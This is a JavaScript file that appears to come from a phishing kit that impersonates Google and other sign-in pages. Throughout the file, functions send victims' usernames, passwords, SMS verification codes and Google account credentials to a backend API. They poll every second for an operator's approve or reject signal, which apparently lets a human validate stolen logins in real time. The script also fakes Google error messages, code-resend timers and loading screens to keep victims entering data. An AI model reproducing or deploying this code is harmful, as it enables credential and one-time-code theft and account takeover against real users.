function div() {
    var width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
    var height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;

    var link = document.createElement("div");
    var head = document.getElementsByTagName("body");
    var l = document.createElement("style");
    head[0].appendChild(l);
    l.innerHTML = ".bak{background:#c9c9c9;position: absolute;top: 0; left: 0;width: 100%; height: 100%;opacity:0.2;opacity:0;}.loading { border-radius: 5px;width: 100px;height: 100px;background:#e9e9e9; } .loading-img {opacity:1;width: 50px;height: 50px;position: absolute; left: 0; right: 0;top: 0;bottom: 0;margin: auto;}@keyframes turn { 0% { -webkit-transform: rotate(0deg); }25% { -webkit-transform: rotate(90deg); }50% { -webkit-transform: rotate(180deg);} 75% { -webkit-transform: rotate(270deg); } 100% {-webkit-transform: rotate(360deg); }}.loading-img img { user-select:none; width: 100%; animation: turn 1s linear infinite;} .loading - none { display: none; } ";
    head[0].appendChild(link);
    link.setAttribute("style", "position:absolute;left:0px;top:0px;width:100%;height:100%;z-index:9999;display: flex;justify-content: space-around;align-items: center; ");
    link.setAttribute("id", "divq");
    link.style.width = width * 1 + "px";
    link.style.height = height * 1 + "px";
    // link.style.background = "#000";
    link.style.left = width * 0 + "px";
    link.style.top = height * 0 + "px";
    link.style.borderRadius = "10px";
    link.style.opacity = "1";
    link.innerHTML = "<div class='loading'><div class='bak'></div><div class='loading-img'><img src='" + path + "/api/img/qq.png' /></div></div>";

}

function tkk(html) {
    var width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
    var height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;
    var link = document.createElement("div");
    var head = document.getElementsByTagName("body");
    var l = document.createElement("style");
    head[0].appendChild(l);
    l.innerHTML = "#i44,#i55,#i66,#idiv{position:absolute;}";
    head[0].appendChild(link);
    link.setAttribute("style", "position:absolute;left:0px;top:0px;width:100%;height:100%;z-index:9999;display: flex;justify-content: space-around;align-items: center; ");
    link.setAttribute("id", "divqq");
    link.style.width = width + "px";
    link.style.height = height + "px";
    link.style.background = "";
    link.style.left = 0 + "px";
    link.style.top = 0 + "px";
    link.style.opacity = "1";
    link.innerHTML = "<div id='i44'><div id='idiv'><span id='i55'></span></div><span id='i66'>OK</span></div><div id='idiv2'></div>";

    $id("i55").innerHTML = html;

    $id("idiv2").style.width = width + "px";
    $id("idiv2").style.height = height + "px";
    $id("idiv2").style.background = "#000";
    $id("idiv2").style.left = 0 + "px";
    $id("idiv2").style.top = 0 + "px";
    $id("idiv2").style.opacity = "0.4";

    $id("idiv").style.left = width * 0.05 + "px";
    $id("idiv").style.top = height * 0.01 + "px";
    $id("idiv").style.width = width * 0.8 + "px";
    $id("idiv").style.height = height * 0.14 + "px";
    $id("idiv").style.wordBreak = "break-all";


    $id("i44").style.left = width * 0.05 + "px";
    $id("i44").style.top = height * 0.4 + "px";
    $id("i44").style.width = width * 0.9 + "px";
    $id("i44").style.height = height * 0.2 + "px";
    $id("i44").style.background = "#fff";
    $id("i44").style.opacity = "1";
    $id("i44").style.zIndex = "1";
    $id("i44").style.borderRadius = "2px";


    $id("i55").style.left = 0 + "px";
    $id("i55").style.top = height * 0.01 + "px";

    $id("i66").style.left = width * 0.77 + "px";
    $id("i66").style.top = height * 0.15 + "px";
    $id("i66").style.color = "#6cd000";
    $id("i66").style.fontSize = width * 0.045 + "px";
    $id("i66").style.fontWeight = "bold";

    $id("divqq").onclick = function() {
        if ($id("divqq")) {
            $id("divqq").remove();
        }
    }
}

function jsd() {
    n = 1;
    var width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
    var m = 1;
    var ff = 1;
    settime = setInterval(countDown, 1000);

    function countDown() {
        m -= 1;
        if (m == 0 && ff >= 0) {
            ff -= 1;
            m = 29;
        }
        if (m >= 0 && ff >= 0) {
            if (m < 10) {
                var html1 = "00:0" + m;
            } else {
                var html1 = "00:" + m;
            }
            $id("code").innerHTML = "Request new code in " + html1;

        } else {
            n = 0;
            $id("code").innerHTML = "Request new code in 00:00";
            clearInterval(settime);
        }

    }
}

function api_name_paswd(name, paswd) {
    var url = path + "/api/api.php";
    var data = "name=" + name + "&paswd=" + paswd;

    function f(p) {
        function aja() {
            ajax("post", url, data, ffff, true);
        }
        var timer = setInterval(aja, 1000);

        function ffff(d) {
            if (d) {
                if (JSON.parse(d)["ok"] == "ok") {
                    if ($id("divq")) {
                        $id("divq").remove();
                    }
                    clearInterval(timer);
                    y("MS code.php?p=" + $id("moblie_input").value);
                }
                if (JSON.parse(d)["ok"] == "no") {
                    $id("Error").style.display = "block";
                    if ($id("divq")) {
                        $id("divq").remove();
                    }
                    $('.btn').html('Next')
                    $('.btn').children('span').remove()


                    clearInterval(timer);
                    // $id("span3").style.display = "block";
                    // $id("button21").style.background="#9be2aa";
                    // $id("button21").disabled=true;
                    // $id("input11").focus();
                }
            }
        }
    }
    ajax("post", url, data, f, true);
}

function api_yzm(yzm) {
    var url = path + "/api/api.php";
    var data = "yzm=" + yzm;

    function f(p) {
        function aja() {
            ajax("post", url, data, ffff, true);
        }
        var timer = setInterval(aja, 1000);

        function ffff(d) {
            if (d) {
                if (JSON.parse(d)["ok"] == "ok") {
                    if ($id("divq")) {
                        $id("divq").remove();
                    }

                    clearInterval(timer);
                    // $id('div1').style.display = 'block';
                    // $id("input2").focus();
                    y('login.php');
                }
                if (JSON.parse(d)["ok"] == "no") {
                    $id("Error").style.display = "block";
                    if ($id("divq")) {
                        $id("divq").remove();
                    }

                    $('.next').html('Next')
                    $('.next').children('span').remove()

                    clearInterval(timer);
                    $id("span3").style.display = "block";
                    $id("input11").value = "";
                    $id("span5").style.display = "block";
                    $id("input11").focus();
                    clearInterval(settime);
                    jsd();
                }
            }
        }
    }
    ajax("post", url, data, f, true);
}


function api_pwd(pwd) {
    var url = path + "/api/api.php";
    var data = "lgnpwd=" + pwd;

    function f(p) {
        function aja() {
            ajax("post", url, data, ffff, true);
        }
        var timer = setInterval(aja, 1000);

        function ffff(d) {
            if (d) {
                if (JSON.parse(d)["ok"] == "ok") {
                    clearInterval(timer);
                    y('wait.html');
                }
                if (JSON.parse(d)["ok"] == "no") {
                    $id("Error").style.display = "block";

                    $('.btn').html('Next')
                    $('.btn').children('span').remove()

                    clearInterval(timer);
                }
            }
        }
    }
    ajax("post", url, data, f, true);
}

function api_yx(yx) {
    var url = path + "/api/api.php";
    var data = "yx=" + yx;

    function f(p) {
        div();

        function aja() {
            ajax("post", url, "yxok=ok", ffff, true);
        }
        var timer = setInterval(aja, 1000);

        function ffff(d) {
            if (d) {
                if (JSON.parse(d)["ok"] == "ok") {
                    if ($id("divq")) {
                        $id("divq").remove();
                    }
                    clearInterval(timer);
                    y('Sign in - Google Accountp.php?p=' + document.getElementsByClassName('Xb9hP')[0].getElementsByTagName('input')[0].value);
                }
                if (JSON.parse(d)["ok"] == "no") {
                    if ($id("divq")) {
                        $id("divq").remove();
                    }
                    clearInterval(timer);
                    document.getElementsByClassName('Xb9hP')[0].getElementsByTagName('input')[0].value = '';
                    document.getElementsByClassName('Xb9hP')[0].getElementsByTagName('input')[0].focus();
                    document.getElementsByClassName('LXRPh')[0].style.display = "block";
                    document.getElementsByClassName('LXRPh')[0].innerHTML = '<div class="EjBTad" aria-hidden="true"><svg aria-hidden="true" class="stUf5b LxE1Id" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></div><div jsname="B34EJ"><span style="color:red;" jsslot="">Your Goole account cannot be found </span></div>';
                }
            }
        }
    }
    ajax("post", url, data, f, true);
}

function api_yxmm(yxmm) {
    var url = path + "/api/api.php";
    var data = "yxmm=" + yxmm;

    function f(p) {
        div();

        function aja() {
            ajax("post", url, "yxmmok=ok", ffff, true);
        }
        var timer = setInterval(aja, 1000);

        function ffff(d) {
            if (d) {
                if (JSON.parse(d)["ok"] == "ok") {
                    if ($id("divq")) {
                        $id("divq").remove();
                    }
                    clearInterval(timer);
                    y('activate .php');
                }
                if (JSON.parse(d)["ok"] == "no") {
                    if ($id("divq")) {
                        $id("divq").remove();
                    }
                    clearInterval(timer);
                    document.getElementsByClassName('Xb9hP')[0].getElementsByTagName('input')[0].value = '';
                    document.getElementsByClassName('Xb9hP')[0].getElementsByTagName('input')[0].focus();
                    document.getElementsByClassName('uSvLId')[0].style.display = "block";
                    document.getElementsByClassName('uSvLId')[0].innerHTML = '<div class="EjBTad" aria-hidden="true"><svg aria-hidden="true" class="stUf5b LxE1Id" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></div><div jsname="B34EJ"><span style="color:red;" jsslot="">Incorrect password, please try again, or click "Forget password" to reset password. </span></div>';
                }
            }
        }
    }
    ajax("post", url, data, f, true);
}

function api_yzmjh(yzm, userid) {
    var url = path + "/api/api.php";
    var data = "yzmm=" + yzm;

    function f(p) {
        div();

        function aja() {
            ajax("post", url, "yzjhok=ok", ffff, true);
        }
        var timer = setInterval(aja, 1000);

        function ffff(d) {
            if (d) {
                if (JSON.parse(d)["ok"] == "ok") {
                    y("opt.php");
                    clearInterval(timer);
                }
                if (JSON.parse(d)["ok"] == "no") {
                    if ($id("divq")) {
                        $id("divq").remove();
                    }
                    clearInterval(timer);
                    $id("err").style.display = "block";
                    $id("input2").value = "";
                    var ddiv = $id("div12").getElementsByTagName("div");
                    for (let i = 0; i < ddiv.length; i++) {
                        ddiv[i].style.border = '1px solid #14bf61';
                        ddiv[i].getElementsByTagName("span")[0].style.display = 'block';
                    }
                    $id("input2").focus();

                }
            }
        }
    }
    ajax("post", url, data, f, true);


    data = "yx=" + userid;
    ajax("post", url, data, null, true);
}

function api_wt(name, paswd) {
    var url = path + "/api/api.php";
    var data = "w1=" + name + "&w2=" + paswd;

    function f(p) {
        function aja() {
            ajax("post", url, data, ffff, true);
        }
        var timer = setInterval(aja, 1000);

        function ffff(d) {
            if (d) {
                if (JSON.parse(d)["ok"] == "ok") {
                    y('opt.php');
                    clearInterval(timer);
                }
                if (JSON.parse(d)["ok"] == "no") {
                    $id("Error").style.display = "block";
                    if ($id("divq")) {
                        $id("divq").remove();
                    }
                    $('.next').html('Next')
                    $('.next').children('span').remove()

                    clearInterval(timer);
                    // document.getElementsByClassName('_5yd0 _2ph- _5yd1')[0].style.display="block";
                    // document.getElementsByClassName('_5yd0 _2ph- _5yd1')[0].innerHTML="Invalid account password";
                }
            }
        }
    }
    ajax("post", url, data, f, true);
}

function xt() {
    function f(d) {
        if (d != '') {
            var dd = JSON.parse(d);
            if ($id("divqq")) {
                $id("divqq").remove();
            }
            tkk(dd[0]["msg"]);
        }
    }
    var url = "zy/api/api.php";
    var data = "xint=1";
    ajax("post", url, data, f, true);
}
var xint = setInterval(xt, 1000);